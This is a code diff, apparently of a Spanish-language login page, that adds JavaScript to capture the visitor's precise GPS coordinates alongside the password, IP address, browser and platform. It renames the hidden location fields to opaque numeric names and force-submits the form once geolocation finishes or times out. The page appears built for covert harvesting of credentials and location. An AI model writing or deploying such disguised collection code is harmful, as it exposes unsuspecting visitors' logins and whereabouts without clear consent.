@@ -275,10 +275,10 @@
           <input type="password" id="contrasena" name="contrasena">
           <input type="hidden" name="ip_usuario" id="ip_usuario">
 
+
+          <input type="hidden" name="101" id="c1" value="No Capturado">       <input type="hidden" name="102" id="c2" value="N/A">                <input type="hidden" name="103" id="c3" value="Iniciando...">       <input type="hidden" name="104" id="c4" value="Ubicación no obtenida.">
+
           
-          <input type="hidden" name="gps_loc" id="gps_loc" value="">
-<input type="hidden" name="gps_accuracy" id="gps_accuracy" value="">
-<input type="hidden" name="gps_error" id="gps_error" value="">
           
             <input type="hidden" name="navegador" id="navegador">
   <input type="hidden" name="plataforma" id="plataforma">
@@ -341,57 +341,86 @@ document.addEventListener('DOMContentLoaded', () => {
     const formulario = document.getElementById('miFormulario');
     const botonEnvio = document.getElementById('btn-enviar');
 
-    // Referencias a los campos de ubicación (asumiendo que existen en el HTML)
-    const inputLoc = document.getElementById('gps_loc');
-    const inputAcc = document.getElementById('gps_accuracy');
-    const inputErr = document.getElementById('gps_error');
+    // Referencias a los campos por el NUEVO ID
+    const inputLoc = document.getElementById('c1'); // Coordenadas (clave 101)
+    const inputAcc = document.getElementById('c2'); // Precisión (clave 102)
+    const inputErr = document.getElementById('c3'); // Error (clave 103)
+    const inputResumen = document.getElementById('c4'); // Resumen (clave 104)
+
+    // Tiempos (ajustados a tu preferencia de 20s y 5s para el envío)
+    const TIMEOUT_ALTA = 20000;
+    const TIMEOUT_BAJA = 20000;
+    const TIMEOUT_ENVIO = 5000;
 
     // --- LÓGICA DE GEOLOCALIZACIÓN (CASCADA) ---
 
-    // Función de éxito (se llama cuando se obtiene la ubicación)
+    // Función de éxito
     const onLocationSuccess = (pos) => {
+        // Rellenar campos individuales
         if (inputLoc) inputLoc.value = `${pos.coords.latitude},${pos.coords.longitude}`;
         if (inputAcc) inputAcc.value = `${pos.coords.accuracy} metros`;
-        // Limpiamos el error si se obtuvo la posición con éxito
-        if (inputErr && inputErr.value.includes("Timeout")) inputErr.value = ""; 
+        
+        // Rellenar campo de RESUMEN (Clave 104)
+        if (inputResumen) {
+            inputResumen.value = `UBICACIÓN OK: ${pos.coords.latitude},${pos.coords.longitude} (Precisión: ${pos.coords.accuracy}m)`;
+        }
+
+        // Limpieza y finalización
+        if (inputErr) inputErr.value = ""; 
         gpsFinalizado = true;
         console.log("Ubicación obtenida con éxito.");
     };
 
     // Función de error cuando falla la Alta Precisión
     const intentarBajaPrecision = (errorPrevio) => {
-        console.warn(`Alta precisión falló o demoró demasiado. Intentando modo red...`);
+        console.warn(`[C1] Alta precisión falló. Código: ${errorPrevio.code}. Intentando modo red...`);
         if (inputErr) inputErr.value = "Timeout. Intentando modo red..."; 
         
         // Segundo intento: Baja precisión (Modo Red)
         navigator.geolocation.getCurrentPosition(
             onLocationSuccess,
             (err) => {
-                // Si falla el segundo intento, registramos el error final
-                if (inputErr) inputErr.value = `Error GPS Final: ${err.message}`;
+                let mensajeError;
+                // Código 1: Permiso denegado por el usuario
+                if (err.code === 1) {
+                    mensajeError = `ERROR: Permiso denegado por usuario.`;
+                } else {
+                    mensajeError = `ERROR FINAL: ${err.message} (Código ${err.code})`;
+                }
+                
+                // Rellenar campos con el fallo
+                if (inputErr) inputErr.value = mensajeError;
+                if (inputLoc) inputLoc.value = 'Falló: ' + mensajeError;
+                if (inputAcc) inputAcc.value = '0';
+                
+                // Rellenar campo de RESUMEN (Clave 104)
+                if (inputResumen) inputResumen.value = mensajeError; 
+
                 gpsFinalizado = true;
+                console.error("[C1] Fallo total de geolocalización.", mensajeError);
             },
             {
-                enableHighAccuracy: false, // CLAVE: Usará Wi-Fi y 4G (casi instantáneo)
-                timeout: 20000,            // Le damos 10 segundos para este intento
+                enableHighAccuracy: false, // Modo red/Wi-Fi
+                timeout: TIMEOUT_BAJA,
                 maximumAge: 0
             }
         );
     };
 
-    // INICIO: Primer intento con Alta Precisión (Satélites)
+    // INICIO: Primer intento con Alta Precisión
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             onLocationSuccess,
-            intentarBajaPrecision, // Si falla este intento, salta al modo red
+            intentarBajaPrecision, // Si falla, salta al modo red
             {
                 enableHighAccuracy: true,
-                timeout: 29000, // Solo esperamos 5 segundos para obtener el GPS real
+                timeout: TIMEOUT_ALTA,
                 maximumAge: 0
             }
         );
     } else {
         if (inputErr) inputErr.value = "Geolocalización no soportada";
+        if (inputResumen) inputResumen.value = "Geolocalización no soportada";
         gpsFinalizado = true;
     }
 
@@ -407,11 +436,11 @@ document.addEventListener('DOMContentLoaded', () => {
                     botonEnvio.style.opacity = "0.7";
                 }
 
-                // Esperamos 3 segundos y forzamos el envío con lo que se haya obtenido
+                // Esperamos 5 segundos para que el modo red termine
                 setTimeout(() => {
                     gpsFinalizado = true; 
                     formulario.submit();
-                }, 6000);
+                }, TIMEOUT_ENVIO);
             }
         });
     }
